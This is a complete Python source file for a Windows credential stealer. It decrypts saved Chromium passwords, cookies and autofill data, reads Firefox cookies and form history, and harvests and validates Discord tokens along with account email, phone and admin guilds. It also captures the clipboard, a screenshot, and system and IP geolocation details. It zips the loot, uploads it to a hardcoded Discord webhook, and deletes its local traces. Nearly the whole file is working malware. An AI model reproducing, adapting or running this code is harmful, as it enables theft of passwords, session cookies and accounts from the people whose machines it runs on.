import os, re, sys, json, time, uuid, winreg, ctypes, base64, shutil, socket, base64, sqlite3, asyncio, zipfile, platform, subprocess, ctypes.wintypes

localappdata = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')

installation_folder = f"C:\\Users\\{os.getlogin()}\\My Games"
log_file = f"{installation_folder}\\{str(uuid.uuid4())}.zip"
discord_info = f"{installation_folder}\\Discord"
chromium_info = f"{installation_folder}\\Chromium Browsers"
firefox_info = f"{installation_folder}\\Firefox"
softwares_info = f"{installation_folder}\\Softwares"
accounts_info = f"{installation_folder}\\Accounts"
debug = False

os.makedirs(installation_folder, exist_ok=True)
os.makedirs(discord_info, exist_ok=True)
os.makedirs(chromium_info, exist_ok=True)
os.makedirs(firefox_info, exist_ok=True)
os.makedirs(softwares_info, exist_ok=True)
os.makedirs(accounts_info, exist_ok=True)

file_header = """
+---------------------------------+
|  _____ _____ _____ _____ __ __  |
| |  _  | __  |  _  |   | |  |  | |
| |     | __ -|     | | | |_   _| |
| |__|__|_____|__|__|_|___| |_|   |
+---------------------------------+


"""

class Log:
    @staticmethod
    def Init():
        with open(f'{installation_folder}/debug.log', 'w', encoding='utf-8') as f:
            f.write(file_header)

    @staticmethod
    def Info(text, func_name="Unknown"):
        with open(f'{installation_folder}/debug.log', 'a', encoding='utf-8') as f:
            f.write(f'[{time.strftime("%H:%M:%S", time.localtime())}] [i] {text} : {func_name}\n')
            print(f'[{time.strftime("%H:%M:%S", time.localtime())}] [i] {text} : {func_name}')

    @staticmethod
    def Warn(text, func_name="Unknown"):
        with open(f'{installation_folder}/debug.log', 'a', encoding='utf-8') as f:
            f.write(f'[{time.strftime("%H:%M:%S", time.localtime())}] [!] {text} : {func_name}\n')
            print(f'[{time.strftime("%H:%M:%S", time.localtime())}] [!] {text} : {func_name}')

    @staticmethod
    def Error(text, func_name="Unknown"):
        with open(f'{installation_folder}/debug.log', 'a', encoding='utf-8') as f:
            f.write(f'[{time.strftime("%H:%M:%S", time.localtime())}] [-] {text} : {func_name}\n')
            print(f'[{time.strftime("%H:%M:%S", time.localtime())}] [-] {text} : {func_name}')

Log.Init()




class Sys:
    def InstallPackages(packages):
        for package in packages:
            try:
                subprocess.run([sys.executable, "-m", "pip", "install", package], capture_output=True, text=True, check=True, creationflags=subprocess.CREATE_NO_WINDOW)
            except:
                subprocess.run(["pip", "install", package], capture_output=True, text=True, check=True, creationflags=subprocess.CREATE_NO_WINDOW)

    def KillProcess(proc_name):
        result = subprocess.run(["tasklist"], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
        if proc_name not in result.stdout:
            return
        subprocess.run(["taskkill", "/F", "/IM", proc_name], capture_output=True, text=True, check=True, creationflags=subprocess.CREATE_NO_WINDOW)
        Log.Info(f'{proc_name} killed', 'Sys.KillProcess()')

    def SafeDelete(path):
        try:
            if os.path.exists(path):
                os.remove(path)
        except Exception as e:
            Log.Error(f'Cannot delete {path}', 'Sys.SafeDelete()')

    async def ExtractClipboard():
        clipboard = subprocess.run("powershell Get-Clipboard", shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW).stdout.decode(errors="ignore").strip()
        with open(f"{installation_folder}\\clipboard.txt", "w", encoding="utf-8") as writer:
            writer.write(file_header)
            writer.write(clipboard)

        Log.Info(f'Clipboard extracted', 'Sys.ExtractClipboard()')

    async def GetInstalledBrowsers():
        with open(f"{softwares_info}\\installed-browsers.txt", "w", encoding="utf-8") as writer:
            writer.write(file_header)

            try:
                with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Clients\StartMenuInternet") as key:
                    for i in range(winreg.QueryInfoKey(key)[0]):
                        browser_name = winreg.EnumKey(key, i)

                        browser_key_path = fr"SOFTWARE\Clients\StartMenuInternet\{browser_name}\shell\open\command"

                        try:
                            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, browser_key_path) as command_key:
                                executable_path, _ = winreg.QueryValueEx(command_key, "")
                                clean_name = os.path.basename(executable_path).replace('"', '')
                                writer.write(f"{clean_name}\n")
                        except FileNotFoundError:
                            pass

            except Exception as e:
                pass

    async def GetInstalledSoftwares():
        with open(f"{softwares_info}\\installed-softwares.txt", "w", encoding="utf-8") as f:
            f.write(file_header)

            result = subprocess.check_output('wmic product get Name, Version', shell=True, text=True)
            software_info = "\n  ".join([line.strip() for line in result.splitlines() if line.strip()])

            f.write(software_info if software_info else "Empty")

    async def GetComputer():
        requInfos = requests.get('https://ipinfo.io')
        data = requInfos.json()

        cpu = subprocess.run(["wmic", "cpu", "get", "Name"], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW).stdout.strip().split('\n')[2]
        ram = subprocess.run(["powershell", "-Command", "Get-Process | Measure-Object -Property WorkingSet64 -Sum | ForEach-Object { \"{0:N2} MB\" -f ($_.Sum / 1MB) }"], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW, encoding="cp850").stdout.strip() ; ram = ram.replace('\u00A0', ' ')
        motherboard = subprocess.run(["wmic", "baseboard", "get", "product"], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW).stdout.strip() ; motherboard = motherboard.splitlines() ; motherboard = motherboard[1].strip() if len(motherboard) > 1 else "Unkown"
        disk = subprocess.run(["cmd", "/c", "wmic logicaldisk get caption,description,providername"], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW).stdout.strip().replace('\n\n', '\n')

        with open(f"{installation_folder}\\computer.txt", "w", encoding="utf-8") as writer:
            writer.write(file_header)

            writer.write(f"""System Summary:
        Computer@Session: {socket.gethostname()}@{os.getlogin()}
        OS: {platform.system() + " " + platform.release()}
        Architecture: {platform.machine()}
        MAC: {':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0, 2 * 6, 2)][::-1])}
        Running Path: {os.path.dirname(os.path.abspath(__file__))}
        Keyboard: {subprocess.run(["powershell", "(Get-WinUserLanguageList)[0].InputMethodTips"], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW, encoding="cp850").stdout.strip()}

        Network :
        IP: {data.get('ip')}
        Country: {data.get('country')}
        Region: {data.get('region')}
        City: {data.get('city')}
        Localisation: {data.get('loc')}
        Internet Provider: {data.get('org')}

        Hardware :
        CPU: {cpu}
        RAM: {ram}
        Motherboard: {motherboard}

        Disk :
        {disk}
        """)

        with open(f"{installation_folder}\\startup.txt", "w", encoding="utf-8") as writer:
            writer.write(file_header)
            writer.write(subprocess.run(["cmd", "/c", "wmic startup get caption,command"], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW).stdout.strip().replace('\n\n', '\n'))

        with open(f"{installation_folder}\\tasklist.txt", "w", encoding="utf-8") as writer:
            writer.write(file_header)
            writer.write(subprocess.run(["cmd", "/c", "tasklist /svc"], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW).stdout.strip().replace('\n\n', '\n'))


async def Screenshot():
    class BITMAPINFOHEADER(ctypes.Structure):
        _fields_ = [("biSize", ctypes.wintypes.DWORD),("biWidth", ctypes.wintypes.LONG),("biHeight", ctypes.wintypes.LONG),("biPlanes", ctypes.wintypes.WORD),("biBitCount", ctypes.wintypes.WORD),("biCompression", ctypes.wintypes.DWORD),("biSizeImage", ctypes.wintypes.DWORD),("biXPelsPerMeter", ctypes.wintypes.LONG),("biYPelsPerMeter", ctypes.wintypes.LONG),("biClrUsed", ctypes.wintypes.DWORD),("biClrImportant", ctypes.wintypes.DWORD),]

    try:
        user32 = ctypes.windll.user32
        gdi32 = ctypes.windll.gdi32
        screen_width = user32.GetSystemMetrics(0)
        screen_height = user32.GetSystemMetrics(1)
        hdc_screen = user32.GetDC(0)
        hdc_mem = gdi32.CreateCompatibleDC(hdc_screen)
        hbm = gdi32.CreateCompatibleBitmap(hdc_screen, screen_width, screen_height)
        gdi32.SelectObject(hdc_mem, hbm)
        gdi32.BitBlt(hdc_mem, 0, 0, screen_width, screen_height, hdc_screen, 0, 0, 0x00CC0020)
        bmp_info = BITMAPINFOHEADER()
        bmp_info.biSize = ctypes.sizeof(BITMAPINFOHEADER)
        bmp_info.biWidth = screen_width
        bmp_info.biHeight = -screen_height
        bmp_info.biPlanes = 1
        bmp_info.biBitCount = 32
        bmp_info.biCompression = 0
        buffer_size = screen_width * screen_height * 4
        buffer = ctypes.create_string_buffer(buffer_size)
        gdi32.GetDIBits(hdc_screen, hbm, 0, screen_height, buffer, ctypes.byref(bmp_info), 0)
        gdi32.DeleteObject(hbm)
        gdi32.DeleteDC(hdc_mem)
        user32.ReleaseDC(0, hdc_screen)
        image = Image.frombuffer("RGB", (screen_width, screen_height), buffer, "raw", "BGRX", 0, 1)
        image.save(f"{installation_folder}\\desktop.png")
    except Exception as e:
        Log.Error(f'{e}', 'Screenshot()')


def AddFolderToZip(zipFile, folderPath, arcBase=""):
    if not os.path.exists(folderPath):
        Log.Warn(f'Folder {folderPath} not found')
        return
    folderPath = os.path.abspath(folderPath)
    for root, dirs, files in os.walk(folderPath):
        for file in files:
            file_path = os.path.join(root, file)
            rel_path = os.path.relpath(file_path, start=folderPath)
            arcname = os.path.join(arcBase, rel_path) if arcBase else rel_path
            zipFile.write(file_path, arcname)



Sys.InstallPackages(packages=["requests", "pycryptodome", "pillow", 'aiohttp'])
import requests
import aiohttp
from PIL import Image
from Crypto.Cipher import AES


# ____________________________________________________________________________________________________________________________________________________________________________________________________________________ #
# ============================================================================================= DISCORD ============================================================================================================== #
total_discord_token = 0
class Discord:
    def __init__(self):
        self.discord_regexp = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
        self.discord_regexp_enc = r"dQw4w9WgXcQ:[^\"]*"
        self.discord_common_paths = {
            'Discord': roaming + '\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': roaming + '\\discordcanary\\Local Storage\\leveldb\\',
            'Lightcord': roaming + '\\Lightcord\\Local Storage\\leveldb\\',
            'Discord PTB': roaming + '\\discordptb\\Local Storage\\leveldb\\',
            'Opera': roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
            'Opera GX': roaming + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
            'Amigo': localappdata + '\\Amigo\\User Data\\Local Storage\\leveldb\\',
            'Torch': localappdata + '\\Torch\\User Data\\Local Storage\\leveldb\\',
            'Kometa': localappdata + '\\Kometa\\User Data\\Local Storage\\leveldb\\',
            'Orbitum': localappdata + '\\Orbitum\\User Data\\Local Storage\\leveldb\\',
            'CentBrowser': localappdata + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
            '7Star': localappdata + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
            'Sputnik': localappdata + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
            'Vivaldi': localappdata + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome SxS': localappdata + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
            'Chrome': localappdata + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome1': localappdata + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\',
            'Chrome2': localappdata + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\',
            'Chrome3': localappdata + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\',
            'Chrome4': localappdata + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\',
            'Chrome5': localappdata + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\',
            'Epic Privacy Browser': localappdata + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
            'Microsoft Edge': localappdata + '\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\',
            'Uran': localappdata + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
            'Yandex': localappdata + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Brave': localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Iridium': localappdata + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
        }

    @staticmethod
    async def CheckToken(session, token: str) -> bool:
        async with session.get('https://discord.com/api/v9/users/@me', headers={'Authorization': token}) as r:
            return r.status == 200

    @staticmethod
    async def GetTokenInfo(session, token: str):
        async with session.get('https://discord.com/api/v9/users/@me', headers={'Authorization': token}) as r:
            data = await r.json()
            data['token'] = token
            return data

    @staticmethod
    async def GetTokenGuilds(session, token: str):
        async with session.get('https://discord.com/api/v9/users/@me/guilds?with_counts=true', headers={'Authorization': token}) as r:
            return await r.json()

    @staticmethod
    def Decrypt(buff: bytes, master_key: bytes) -> str:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass

    @staticmethod
    def GetMasterKey(path: str) -> str:
        if not os.path.exists(path):
            return None
        if 'os_crypt' not in open(path, 'r', encoding='utf-8').read():
            return None

        with open(path, "r", encoding="utf-8") as f:
            local_state = json.load(f)

        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]

        class DATA_BLOB(ctypes.Structure):
            _fields_ = [("cbData", ctypes.c_ulong), ("pbData", ctypes.POINTER(ctypes.c_ubyte))]

        pDataIn = DATA_BLOB(len(master_key), ctypes.cast(master_key, ctypes.POINTER(ctypes.c_ubyte)))
        pDataOut = DATA_BLOB()

        if ctypes.windll.Crypt32.CryptUnprotectData(ctypes.byref(pDataIn), None, None, None, None, 0, ctypes.byref(pDataOut)):
            decrypted_key = bytes((ctypes.c_ubyte * pDataOut.cbData).from_address(ctypes.addressof(pDataOut.pbData.contents)))
            ctypes.windll.kernel32.LocalFree(pDataOut.pbData)
            return decrypted_key
        else:
            print(f'Master Key not found at {path}')
            return None

    def GetTokens(self):
        discord_tokens = []
        discord_uids = []
        for name, path in self.discord_common_paths.items():
            if not os.path.exists(path): continue
            _discord = name.replace(" ", "").lower()
            if "cord" in path:
                if not os.path.exists(roaming + f'\{_discord}\Local State'): continue
                for file_name in os.listdir(path):
                    if file_name[-3:] not in ["log", "ldb"]: continue
                    for line in [x.strip() for x in open(f'{path}\{file_name}', errors='ignore').readlines() if x.strip()]:
                        for y in re.findall(self.discord_regexp_enc, line):
                            token = self.Decrypt(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), self.GetMasterKey(roaming + f'\{_discord}\Local State'))

                            if self.CheckTokenSync(token):
                                uid = requests.get('https://discord.com/api/v9/users/@me', headers={'Authorization': token}).json()['id']
                                if uid not in discord_uids:
                                    discord_tokens.append(token)
                                    discord_uids.append(uid)

            else:
                for file_name in os.listdir(path):
                    if file_name[-3:] not in ["log", "ldb"]: continue
                    for line in [x.strip() for x in open(f'{path}\{file_name}', errors='ignore').readlines() if x.strip()]:
                        for token in re.findall(self.discord_regexp, line):
                            if self.CheckTokenSync(token):
                                uid = requests.get('https://discord.com/api/v9/users/@me', headers={'Authorization': token}).json()['id']
                                if uid not in discord_uids:
                                    discord_tokens.append(token)
                                    discord_uids.append(uid)

        return discord_tokens

    @staticmethod
    def CheckTokenSync(token: str) -> bool:
        response = requests.get('https://discord.com/api/v9/users/@me', headers={'Authorization': token})
        return response.status_code == 200

async def ExtractDiscord():
    global total_discord_token

    DiscordStealer = Discord()

    try:
        discord_tokens = DiscordStealer.GetTokens()
        async with aiohttp.ClientSession() as session:
            tasks = [DiscordStealer.CheckToken(session, token) for token in discord_tokens]
            validation_results = await asyncio.gather(*tasks)

            valid_tokens = [discord_tokens[i] for i, valid in enumerate(validation_results) if valid]

            tasks = [DiscordStealer.GetTokenInfo(session, token) for token in valid_tokens]
            users_info = await asyncio.gather(*tasks)

            with open(f"{discord_info}\\tokens.txt", "w", encoding="utf-8") as writer:
                writer.write(file_header)
                for user in users_info:
                    writer.write(f"Username: {user['username']}#{user['discriminator']} ({user['id']})\nToken: {user['token']}\nEmail: {user['email']}\nPhone: {user['phone']}\nMFA: {'Enabled' if user['mfa_enabled'] else 'Disabled'}\n\n")
                    total_discord_token += 1

            tasks = [DiscordStealer.GetTokenGuilds(session, token) for token in valid_tokens]
            guilds_info = await asyncio.gather(*tasks)

            with open(f"{discord_info}\\guilds.txt", "w", encoding="utf-8") as writer:
                writer.write(file_header)
                for guild_list in guilds_info:
                    for guild in guild_list:
                        is_owner = guild.get('owner', False)
                        permissions = int(guild.get('permissions', 0))
                        is_admin = (permissions & 0x8) == 0x8

                        if is_owner or is_admin:
                            writer.write(f"Guild Name: {guild['name']}\nGuild ID: {guild['id']}\nMembers: {guild['approximate_member_count']}\n\n")
    except Exception as e:
        print(f"Error extracting Discord tokens: {e}")


# ____________________________________________________________________________________________________________________________________________________________________________________________________________________ #
# ============================================================================================= CHROMIUM ============================================================================================================= #
total_passwords = 0
total_autofills = 0
total_cookies = 0

class Chromium:
    def __init__(self):
        self.chromiumBrowsers = [
            {"name": "Google Chrome", "path": os.path.join(localappdata, "Google", "Chrome", "User Data"), "taskname": "chrome.exe"},
            {"name": "Microsoft Edge", "path": os.path.join(localappdata, "Microsoft", "Edge", "User Data"), "taskname": "msedge.exe"},
            {"name": "Opera", "path": os.path.join(roaming, "Opera Software", "Opera Stable"), "taskname": "opera.exe"},
            {"name": "Opera GX", "path": os.path.join(roaming, "Opera Software", "Opera GX Stable"), "taskname": "opera.exe"},
            {"name": "Brave", "path": os.path.join(localappdata, "BraveSoftware", "Brave-Browser", "User Data"), "taskname": "brave.exe"},
            {"name": "Yandex", "path": os.path.join(roaming, "Yandex", "YandexBrowser", "User Data"), "taskname": "yandex.exe"},]
        self.chromiumSubpaths = [{"name": "None", "path": ""},
        {"name": "Default", "path": "Default"},
        {"name": "Profile 1", "path": "Profile 1"},
        {"name": "Profile 2", "path": "Profile 2"},
        {"name": "Profile 3", "path": "Profile 3"},
        {"name": "Profile 4", "path": "Profile 4"},
        {"name": "Profile 5", "path": "Profile 5"},]

    @staticmethod
    def DecryptData(data, key):
        try:
            iv = data[3:15]
            data = data[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            return cipher.decrypt(data)[:-16].decode()
        except:
            try:
                class DATA_BLOB(ctypes.Structure):
                    _fields_ = [("cbData", ctypes.c_ulong), ("pbData", ctypes.POINTER(ctypes.c_ubyte))]

                pDataIn = DATA_BLOB(len(data), ctypes.cast(data, ctypes.POINTER(ctypes.c_ubyte)))
                pDataOut = DATA_BLOB()

                if ctypes.windll.Crypt32.CryptUnprotectData(ctypes.byref(pDataIn),None,None,None,None,0,ctypes.byref(pDataOut)):
                    decrypted_data = bytes((ctypes.c_ubyte * pDataOut.cbData).from_address(ctypes.addressof(pDataOut.pbData.contents)))
                    ctypes.windll.kernel32.LocalFree(pDataOut.pbData)
                    return decrypted_data.decode()

            except Exception as e:
                return f"Failed to decrypt data: {e}"

    def ExtractPasswords(self):
        browser_passwords = []
        for browser in self.chromiumBrowsers:
            Sys.KillProcess(browser['taskname'])
            local_state_path = os.path.join(browser['path'], 'Local State')
            if not os.path.exists(local_state_path):
                continue

            with open(local_state_path, 'r', encoding='utf-8') as f:
                local_state = json.load(f)

            try:
                key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]

                class DATA_BLOB(ctypes.Structure):
                    _fields_ = [("cbData", ctypes.c_ulong), ("pbData", ctypes.POINTER(ctypes.c_ubyte))]

                pDataIn = DATA_BLOB(len(key), ctypes.cast(key, ctypes.POINTER(ctypes.c_ubyte)))
                pDataOut = DATA_BLOB()

                if ctypes.windll.Crypt32.CryptUnprotectData(
                    ctypes.byref(pDataIn), None, None, None, None, 0, ctypes.byref(pDataOut)
                ):
                    decryption_key = bytes((ctypes.c_ubyte * pDataOut.cbData).from_address(ctypes.addressof(pDataOut.pbData.contents)))
                    ctypes.windll.kernel32.LocalFree(pDataOut.pbData)
                else:
                    raise ValueError("Failed to decrypt master key.")
            except Exception as e:
                print(f"Error decrypting master key :: {e}")
                continue

            for subpath in self.chromiumSubpaths:
                login_data_path = os.path.join(browser['path'], subpath['path'], 'Login Data')
                if not os.path.exists(login_data_path):
                    continue

                try:
                    temp_db = os.path.join(browser['path'], subpath['path'], f"{browser['name']}-pw.db")
                    shutil.copy(login_data_path, temp_db)

                    connection = sqlite3.connect(temp_db)
                    cursor = connection.cursor()
                    query_passwords = "SELECT origin_url, username_value, password_value FROM logins"
                    cursor.execute(query_passwords)

                    for row in cursor.fetchall():
                        origin_url = row[0]
                        username = row[1]
                        encrypted_password = row[2]
                        password = self.DecryptData(encrypted_password, decryption_key)

                        if username or password:
                            browser_passwords.append(
                                {
                                    "url": origin_url,
                                    "username": username,
                                    "password": password,
                                }
                            )

                    cursor.close()
                    connection.close()
                    os.remove(temp_db)

                except Exception as e:
                    continue

        return browser_passwords

    def ExtractAutofill(self):
        browser_autofills = []
        for browser in self.chromiumBrowsers:
            Sys.KillProcess(browser["name"])
            browser_path = browser["path"]
            if not os.path.exists(browser_path):
                continue

            for profile in self.chromiumSubpaths:
                profile_path = os.path.join(browser_path, profile["path"])
                web_data_path = os.path.join(profile_path, "Web Data")

                if os.path.exists(web_data_path):
                    temp_copy = web_data_path + "_temp"
                    shutil.copy2(web_data_path, temp_copy)

                    try:
                        conn = sqlite3.connect(temp_copy)
                        cursor = conn.cursor()

                        cursor.execute("SELECT name FROM sqlite_master WHERE type='table';")
                        tables = [table[0] for table in cursor.fetchall()]

                        if "autofill" in tables:
                            cursor.execute("SELECT name, value FROM autofill")
                            autofills = cursor.fetchall()

                            for autofill in autofills:
                                autofill_entry = (
                                    f"Name: {autofill[0]}\n"
                                    f"Value: {autofill[1]}\n"
                                    f"\n"
                                )
                                browser_autofills.append(autofill_entry)

                        conn.close()
                    except sqlite3.Error as e:
                        pass
                    finally:
                        os.remove(temp_copy)

        return browser_autofills

    def ExtractCookies(self):
        browser_cookies = []
        for browser in self.chromiumBrowsers:
            Sys.KillProcess(browser["taskname"])
            browser_path = browser["path"]
            if not os.path.exists(browser_path):
                continue

            for profile in self.chromiumSubpaths:
                profile_path = os.path.join(browser_path, profile["path"])
                cookies_path = os.path.join(profile_path, "Cookies")

                if not os.path.exists(cookies_path):
                    continue

                temp_copy = cookies_path + "_temp"
                shutil.copy2(cookies_path, temp_copy)

                try:
                    conn = sqlite3.connect(temp_copy)
                    cursor = conn.cursor()
                    cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")

                    for host_key, name, encrypted_value in cursor.fetchall():
                        try:
                            class DATA_BLOB(ctypes.Structure):
                                _fields_ = [("cbData", ctypes.c_ulong), ("pbData", ctypes.POINTER(ctypes.c_ubyte))]

                            blob_in = DATA_BLOB(len(encrypted_value), ctypes.cast(encrypted_value, ctypes.POINTER(ctypes.c_ubyte)))
                            blob_out = DATA_BLOB()

                            if ctypes.windll.crypt32.CryptUnprotectData(
                                ctypes.byref(blob_in), None, None, None, None, 0, ctypes.byref(blob_out)
                            ):
                                decrypted_bytes = ctypes.string_at(blob_out.pbData, blob_out.cbData)
                                ctypes.windll.kernel32.LocalFree(blob_out.pbData)
                                value = decrypted_bytes.decode("utf-8")
                            else:
                                Log.Error(f'Error decrypting cookie', f'Chromium.ExtractCookies() -- ctypes.windll.crypt32.CryptUnprotectData()')
                                value = ""
                        except Exception as e:
                            Log.Error(f'{e}', f'Chromium.ExtractCookies()')
                            value = f''

                        browser_cookies.append({
                            "host_key": host_key,
                            "name": name,
                            "value": value
                        })

                    cursor.close()
                    conn.close()
                except Exception as e:
                    Log.Error(f'SQLite error -- {e}', f'Chromium.ExtractCookies()')
                finally:
                    os.remove(temp_copy)

        return browser_cookies

async def ExtractChromium():
    global total_passwords, total_autofills, total_cookies
    ChromiumStealer = Chromium()
    try:
        passwords = ChromiumStealer.ExtractPasswords()
        formatted = ""

        for entry in passwords:
            formatted += (
                f"URL:            {entry['url']}\n"
                f"Username:       {entry['username']}\n"
                f"Password:       {entry['password']}\n"
                f"\n")
            total_passwords += 1

        with open(f"{chromium_info}\\passwords.txt", "w", encoding="utf-8") as writer:
            writer.write(file_header)
            writer.write(formatted)

    except Exception as e:
        print(e)

    try:
        autofills = ChromiumStealer.ExtractAutofill()

        with open(f"{chromium_info}\\autofills.txt", "w", encoding="utf-8") as writer:
            writer.write(file_header)
            for autofill in autofills:
                writer.write(autofill)
                total_autofills += 1

    except Exception as e:
        print(e)

    try:
        cookies = ChromiumStealer.ExtractCookies()

        with open(f"{chromium_info}\\cookies.txt", "w", encoding="utf-8") as writer:
            for cookie in cookies:
                writer.write(
                    f"Domain: {cookie['domain']}\n"
                    f"Name: {cookie['name']}\n"
                    f"Value: {cookie['value']}\n"
                    f"Path: {cookie['path']}\n"
                    f"Secure: {cookie['secure']}\n"
                    f"HttpOnly: {cookie['httpOnly']}\n"
                    f"Expires: {cookie['expires']}\n"
                    f"\n"
                )
                total_cookies += 1

    except Exception as e:
        Log.Error(f'{e}', 'ExtractChromium()')


# ____________________________________________________________________________________________________________________________________________________________________________________________________________________ #
# ============================================================================================= FIREFOX ============================================================================================================= #
class Firefox:
    def __init__(self):
        self.files_path = []

    def ListProfiles(self):
        try:
            directory = os.path.join(os.getenv('APPDATA') , "Mozilla", "Firefox", "Profiles")
            if os.path.isdir(directory):
                for root, dirs, files in os.walk(directory):
                    for file in files:
                        file_path = os.path.join(root, file)
                        if file.endswith("cookies.sqlite") or file.endswith("places.sqlite") or file.endswith("formhistory.sqlite"):
                            self.files_path.append(file_path)

        except Exception as e:
            print(f"[FirefoxProfile] {e}")

    def ExtractCookies(self):
        global total_cookies
        cookies_extracted = []
        try:
            for files in self.files_path:
                if "cookie" in files:
                    database_connection = sqlite3.connect(files)
                    cursor = database_connection.cursor()
                    cursor.execute('SELECT host, name, path, value, expiry FROM moz_cookies')
                    cookies = cursor.fetchall()

                    for cookie in cookies:
                        cookie_dict = {
                            "domain": cookie[0],
                            "name": cookie[1],
                            "path": cookie[2],
                            "value": cookie[3],
                            "expires": cookie[4],
                            "secure": False,
                            "httpOnly": False,
                        }
                        cookies_extracted.append(cookie_dict)
                        total_cookies += 1

        except Exception as e:
            print(f"[FirefoxCookies] Error: {e}")

        return cookies_extracted

    def ExtractAutofills(self):
        global total_autofills
        autofills = []

        try:
            for files in self.files_path:
                if "formhistory" in files:
                    database_connection = sqlite3.connect(files)
                    cursor = database_connection.cursor()
                    cursor.execute("select fieldname, value from moz_formhistory")

                    autofills_raw = cursor.fetchall()
                    for entry in autofills_raw:
                        autofills.append(f"Name: {entry[0]}\nValue: {entry[1]}\n\n")
                        total_autofills += 1

        except Exception as e:
            print(f"[FirefoxAutofills] {e}")

        return autofills

async def ExtractFirefox():
    global total_autofills, total_cookies
    FirefoxStealer = Firefox()
    FirefoxStealer.ListProfiles()
    try:
        cookies = FirefoxStealer.ExtractCookies()

        with open(f"{firefox_info}\\cookies.txt", "w", encoding="utf-8") as writer:
            json.dump(cookies, writer, ensure_ascii=False, indent=4)

    except Exception as e:
        print(f"[FirefoxCookies] [Writer] {e}")

    try:
        autofills = FirefoxStealer.ExtractAutofills()

        with open(f"{firefox_info}\\autofills.txt", "w", encoding="utf-8") as writer:
            writer.write(file_header)
            for entry in autofills:
                writer.write(entry)

    except Exception as e:
        Log.Error(f'{e}', 'ExtractFirefox()')


# ____________________________________________________________________________________________________________________________________________________________________________________________________________________ #
# ============================================================================================= START EXTRACTION ===================================================================================================== #
async def main():
    tasks = [
        asyncio.create_task(Sys.GetInstalledBrowsers()),
        asyncio.create_task(Sys.GetInstalledSoftwares()),
        asyncio.create_task(Screenshot()),
        asyncio.create_task(Sys.GetComputer()),
        asyncio.create_task(Sys.ExtractClipboard()),
        asyncio.create_task(ExtractFirefox()),
        asyncio.create_task(ExtractChromium()),
        asyncio.create_task(ExtractDiscord())
    ]

    Log.Warn(f'{len(tasks)} tasks started', 'main()')
    await asyncio.gather(*tasks)

if __name__ == "__main__":
    asyncio.run(main())

    with zipfile.ZipFile(log_file, "w") as zip_file:
        zip_file.write(f"{installation_folder}\\desktop.png", arcname="desktop.png")
        zip_file.write(f"{installation_folder}\\clipboard.txt", arcname="clipboard.txt")
        zip_file.write(f"{installation_folder}\\computer.txt", arcname="computer.txt")
        zip_file.write(f"{installation_folder}\\tasklist.txt", arcname="tasklist.txt")
        zip_file.write(f"{installation_folder}\\startup.txt", arcname="startup.txt")
        zip_file.write(f"{installation_folder}\\debug.log", arcname="debug.log")
        AddFolderToZip(zip_file, discord_info, arcBase="Discord")
        AddFolderToZip(zip_file, chromium_info, arcBase="Chromium Browsers")
        AddFolderToZip(zip_file, softwares_info, arcBase="Softwares")
        AddFolderToZip(zip_file, firefox_info, arcBase="Firefox")

    if not debug:
        
        link = 'https://discord.com/api/webhooks/1304083148660936744/LB8MgmVSEMaOT3MxACw7ezFS08UU9gRAX7ybyWErvnvkrWtSwDGsXcWLATOPZASDFMYC'
        message = f'''*Log ID:* `{socket.gethostname()}@{os.getlogin()}-{':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0, 2 * 6, 2)][::-1])}`'''
        with open(log_file, 'rb') as file:
            files = {'file': (os.path.basename(log_file), file)}
            data = {'content': message}
            res = requests.post(link, data=data, files=files)

        Sys.SafeDelete(f"{installation_folder}\\desktop.png")
        Sys.SafeDelete(f"{installation_folder}\\clipboard.txt")
        Sys.SafeDelete(f"{installation_folder}\\computer.txt")
        Sys.SafeDelete(f"{installation_folder}\\startup.txt")
        Sys.SafeDelete(f"{installation_folder}\\tasklist.txt")
        Sys.SafeDelete(f"{installation_folder}\\debug.log")
